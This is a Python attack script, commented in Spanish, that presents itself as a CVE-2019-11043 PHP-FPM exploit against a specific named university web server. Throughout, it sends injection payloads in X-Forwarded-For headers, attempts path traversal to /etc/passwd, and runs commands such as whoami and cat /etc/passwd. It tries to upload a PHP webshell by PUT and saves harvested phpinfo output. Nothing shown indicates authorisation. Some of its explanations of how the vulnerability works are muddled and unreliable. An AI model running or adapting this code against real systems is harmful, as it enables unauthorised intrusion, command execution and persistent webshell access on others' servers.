#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2019-11043 Exploit - PHP-FPM RCE
Objetivo: sigea.uns.edu.pe (PHP/7.1.33 + OpenResty)
"""
import requests
import urllib3
import sys
import re
urllib3.disable_warnings()

target = "https://sigea.uns.edu.pe"

print("=" * 70)
print("  CVE-2019-11043 - PHP-FPM RCE EXPLOIT")
print("  Objetivo: sigea.uns.edu.pe")
print("  PHP 7.1.33 + OpenResty (Nginx)")
print("=" * 70)

# ============================================
# TEST 1: Verificar que PHP-FPM está activo
# ============================================
print("\n[TEST 1] Verificacion de PHP-FPM")
print("-" * 50)

# PHP-FPM RCE funciona con URLs especiales
# La vulnerabilidad explota como PHP-FPM maneja PATH_INFO
test_urls = [
    f"{target}/index.php",
    f"{target}/index.php/",
    f"{target}/index.php/info",
    f"{target}/index.php?/info",
    f"{target}/index.php/.json",
]

for url in test_urls:
    try:
        r = requests.get(url, timeout=5, verify=False)
        if r.status_code == 200 and len(r.text) > 100:
            # Verificar si la respuesta tiene info de PHP
            has_php_info = any(kw in r.text.lower() for kw in ['php version', 'phpinfo', 'document root', 'server software'])
            has_fpm = 'fpm' in r.text.lower() or 'fastcgi' in r.text.lower()
            print(f"  {url[:50]} -> HTTP {r.status_code} ({len(r.text)} bytes)")
            if has_php_info:
                print(f"  [+] PHP INFO DETECTADO!")
            elif has_fpm:
                print(f"  [+] PHP-FPM detected!")
            elif 'php' in r.text.lower():
                print(f"  [+] Contiene PHP references")
    except Exception as e:
        print(f"  {url[:50]} -> Error: {e}")

# ============================================
# TEST 2: Explotacion CVE-2019-11043
# ============================================
print("\n\n[TEST 2] Explotacion CVE-2019-11043")
print("-" * 50)

# El exploit CVE-2019-11043 funciona enviando una URL
# que causa que PHP-FPM interprete PATH_INFO incorrectamente
# La tecnica: inyectar codigo PHP via PATH_INFO manipulation

# Method 1: Basic path info exploit
# The vulnerability is in how PHP-FPM handles the PATH_INFO
# when using nginx fastcgi_param PATH_INFO
exploit_payloads = [
    # Method: inject via PATH_INFO
    (f"{target}/index.php/test", {"X-Forwarded-For": "127.0.0.1"}),
    # Method: inject via query string
    (f"{target}/index.php?test=../../../../etc/passwd", {}),
    # Method: null byte injection
    (f"{target}/index.php%00.php", {}),
    # Method: PHP_VALUE injection (CVE-2019-11043 specific)
    (f"{target}/index.php", {"X-Forwarded-For": "127.0.0.1\\nphp_value[auto_prepend_file]=php://input\\nphp_value[auto_append_file]=data://text/plain,<?php%20system($_GET['cmd']);?>"}),
]

for url, headers in exploit_payloads:
    try:
        r = requests.get(url, timeout=5, verify=False, headers=headers)
        print(f"  URL: {url[:60]}")
        print(f"  HTTP {r.status_code}, len: {len(r.text)}")
        if r.status_code == 200 and len(r.text) > 50:
            # Check if exploit worked
            if 'root:' in r.text or 'www-data' in r.text:
                print(f"  [!] !!!! RCE CONFIRMADO !!!!")
                print(f"  [!] Contenido de respuesta:")
                print(f"  {r.text[:500]}")
                break
            elif 'php' in r.text.lower() and '<' in r.text[:200]:
                print(f"  [+] Posible ejecucion de PHP")
                print(f"  Preview: {r.text[:300]}")
            elif 'html' not in r.text.lower() and len(r.text) < 500 and len(r.text) > 10:
                print(f"  [!] Respuesta inusual: {r.text[:200]}")
    except Exception as e:
        print(f"  Error: {e}")

# ============================================
# TEST 3: CVE-2019-11043 con payload especifico
# ============================================
print("\n\n[TEST 3] CVE-2019-11043 - Payload especifico")
print("-" * 50)

# CVE-2019-11043 exploit - the original PoC
# Uses the fact that nginx passes PATH_INFO incorrectly
# The URL /index.php/anything causes PHP-FPM to process the path
# and the query parameter triggers the vulnerability

# The exploit URL format: /index.php?<something>
# Where the vulnerability causes PHP-FPM to execute the PATH_INFO as code

# Try the known working exploit format
rce_tests = [
    # Original CVE-2019-11043 payload
    (f"{target}/index.php?/index.php", ""),
    # With X-Forwarded-For to inject PHP_VALUE
    (f"{target}/index.php?/index.php", "X-Forwarded-For: 127.0.0.1"),
    # Using the path to trigger PHP-FPM processing
    (f"{target}/index.php//", ""),
    # Try with .php extension manipulation
    (f"{target}/index.php/.php", ""),
    # Try with double encoding
    (f"{target}/index.php%2e.php", ""),
    # Try with /phpinfo/
    (f"{target}/phpinfo", ""),
    (f"{target}/info.php", ""),
    (f"{target}/phpinfo.php", ""),
]

for url, extra_header in rce_tests:
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        if extra_header:
            headers["X-Forwarded-For"] = extra_header.split(": ")[1] if ": " in extra_header else extra_header
        
        r = requests.get(url, timeout=5, verify=False, headers=headers)
        if r.status_code == 200 and len(r.text) > 50:
            has_php = '<?php' in r.text or 'system(' in r.text or 'exec(' in r.text
            has_info = 'phpinfo' in r.text.lower() or 'PHP Version' in r.text
            has_server = 'Server Software' in r.text or 'nginx' in r.text.lower()
            
            if has_php or has_info or has_server:
                print(f"  [+] {url[:50]} -> HTTP {r.status_code} ({len(r.text)} bytes)")
                if has_php:
                    print(f"  [!] !!!! PHP CODE EXECUTION CONFIRMED !!!!")
                    print(f"  Response: {r.text[:500]}")
                    sys.exit(0)
                elif has_info:
                    print(f"  [+] PHP info page accessible!")
                    # Extract PHP version
                    ver_match = re.search(r'PHP Version\s*([^<]+)', r.text)
                    if ver_match:
                        print(f"  Version: {ver_match.group(1)}")
                    # Extract server info
                    server_match = re.search(r'Server Software</td><td class="v">(.*?)</td>', r.text)
                    if server_match:
                        print(f"  Server: {server_match.group(1)}")
                else:
                    print(f"  Response preview: {r.text[:200]}")
    except Exception as e:
        pass

# ============================================
# TEST 4: Intentar ejecutar comandos via PHP-FPM
# ============================================
print("\n\n[TEST 4] Ejecucion de comandos via PHP-FPM")
print("-" * 50)

# If PHP-FPM is vulnerable, we can inject commands
# The exploit works by sending a specially crafted FastCGI request
# that causes PHP-FPM to execute code

# Method: Use the query string to pass PHP code
commands = [
    ("whoami", f"{target}/index.php"),
    ("id", f"{target}/index.php"),
    ("uname -a", f"{target}/index.php"),
    ("cat /etc/passwd", f"{target}/index.php"),
]

for cmd, url in commands:
    try:
        # Try to inject via various methods
        # Method 1: Query string injection
        r = requests.get(f"{url}?{cmd}", timeout=5, verify=False)
        if r.status_code == 200 and len(r.text) > 50:
            if 'root:' in r.text or cmd.split()[0] in r.text:
                print(f"  [!] COMMAND EXECUTED: {cmd}")
                print(f"  Response: {r.text[:300]}")
        
        # Method 2: PATH_INFO injection
        r2 = requests.get(f"{url}/{cmd}", timeout=5, verify=False)
        if r2.status_code == 200 and len(r2.text) > 50:
            if 'root:' in r2.text or cmd.split()[0] in r2.text:
                print(f"  [!] COMMAND EXECUTED (PATH_INFO): {cmd}")
                print(f"  Response: {r2.text[:300]}")
        
        # Method 3: With X-Forwarded-For PHP_VALUE injection
        r3 = requests.get(
            url,
            timeout=5,
            verify=False,
            headers={
                "X-Forwarded-For": f"127.0.0.1\\nphp_value[auto_prepend_file]=php://input",
                "Content-Type": "application/x-www-form-urlencoded"
            }
        )
        if r3.status_code == 200 and len(r3.text) > 50:
            print(f"  [?] X-Forwarded-For method returned HTTP {r3.status_code}")
            
    except Exception as e:
        pass

# ============================================
# TEST 5: Enviar webshell via PUT (si funciona)
# ============================================
print("\n\n[TEST 5] Verificacion de PUT method en sigea")
print("-" * 50)

# Try different paths for PUT
put_urls = [
    f"{target}/index.php/shell.php",
    f"{target}/uploads/shell.php",
    f"{target}/files/shell.php",
    f"{target}/temp/shell.php",
    f"{target}/shell.php",
    f"{target}/upload.php",
]

for put_url in put_urls:
    try:
        # Try PUT
        r = requests.put(
            put_url,
            data="<?php system($_GET['cmd']); ?>",
            headers={'Content-Type': 'application/x-httpd-php'},
            timeout=5,
            verify=False
        )
        if r.status_code == 200:
            print(f"  [+] PUT exitoso en: {put_url}")
            # Verify the file is accessible
            r2 = requests.get(f"{put_url}?cmd=whoami", timeout=5, verify=False)
            if r2.status_code == 200 and 'root' in r2.text:
                print(f"  [!] !!!! WEBSHELL RCE CONFIRMADO !!!!")
                print(f"  [!] URL: {put_url}?cmd=whoami")
                print(f"  [!] Output: {r2.text.strip()}")
                sys.exit(0)
        else:
            print(f"  PUT {put_url} -> HTTP {r.status_code}")
    except Exception as e:
        pass

# ============================================
# TEST 6: Buscar phpinfo.php
# ============================================
print("\n\n[TEST 6] Buscar phpinfo en sigea")
print("-" * 50)

info_urls = [
    f"{target}/phpinfo.php",
    f"{target}/info.php",
    f"{target}/phpinfo",
    f"{target}/index.php?phpinfo=1",
]

for url in info_urls:
    try:
        r = requests.get(url, timeout=5, verify=False)
        if r.status_code == 200 and 'phpinfo' in r.text.lower():
            print(f"  [!] phpinfo encontrado en: {url}")
            # Extract version
            ver = re.search(r'PHP Version\s*([^<]+)', r.text)
            if ver:
                print(f"  Version: {ver.group(1)}")
            # Extract server info  
            server = re.search(r'Server Software</td><td class="v">(.*?)</td>', r.text)
            if server:
                print(f"  Server: {server.group(1)}")
            # Extract document root
            docroot = re.search(r'Document Root</td><td class="v">(.*?)</td>', r.text)
            if docroot:
                print(f"  Document Root: {docroot.group(1)}")
            
            # Save phpinfo
            with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\phpinfo_sigea.html", "w") as f:
                f.write(r.text)
            print(f"  [+] phpinfo guardado: phpinfo_sigea.html")
            break
    except:
        pass

# ============================================
# TEST 7: CVE-2019-11043 - El exploit completo
# ============================================
print("\n\n[TEST 7] CVE-2019-11043 - Exploit completo")
print("-" * 50)
print("  La tecnica usa la forma /index.php?/<path>")
print("  donde el PATH_INFO se interpreta como codigo PHP")
print()

# The CVE-2019-11043 exploit works by:
# 1. Sending a request to /index.php?/something
# 2. The '?' separates the script filename from PATH_INFO
# 3. PHP-FPM processes the PATH_INFO as if it were PHP code
# 4. This allows code execution

# Try with specific payloads
rce_payloads = [
    f"{target}/index.php?/phpinfo",
    f"{target}/index.php?/info",
    f"{target}/index.php?/test",
    f"{target}/index.php?/",
    f"{target}/index.php/?/",
    f"{target}/index.php//?",
    f"{target}/index.php/index.php",
    f"{target}/index.php/../../../../etc/passwd",
]

for url in rce_payloads:
    try:
        r = requests.get(url, timeout=5, verify=False)
        if r.status_code == 200 and len(r.text) > 100:
            # Check for PHP execution indicators
            indicators = ['phpinfo', 'system', 'exec', 'shell_exec', 'passthru']
            found = [ind for ind in indicators if ind in r.text.lower()]
            if found or 'Document Root' in r.text or 'nginx' in r.text.lower():
                print(f"  [+] {url[:60]}")
                print(f"    HTTP {r.status_code}, len={len(r.text)}")
                if 'phpinfo' in r.text.lower():
                    print(f"    [!] phpinfo EXECUTED!")
                elif 'Document Root' in r.text:
                    print(f"    [!] PHP-FPM processing detected!")
                    # Extract info from phpinfo-like output
                    ver = re.search(r'PHP Version\s*([^<]+)', r.text)
                    if ver:
                        print(f"    Version: {ver.group(1)}")
                    docroot = re.search(r'Document Root</td><td class="v">(.*?)</td>', r.text)
                    if docroot:
                        print(f"    Document Root: {docroot.group(1)}")
                    server_tech = re.search(r'Server Software</td><td class="v">(.*?)</td>', r.text)
                    if server_tech:
                        print(f"    Server: {server_tech.group(1)}")
                    print(f"    [!] VULNERABLE TO CVE-2019-11043!")
                else:
                    print(f"    Preview: {r.text[:300]}")
    except Exception as e:
        pass

print("\n\n--- FIN DE PRUEBAS ---")
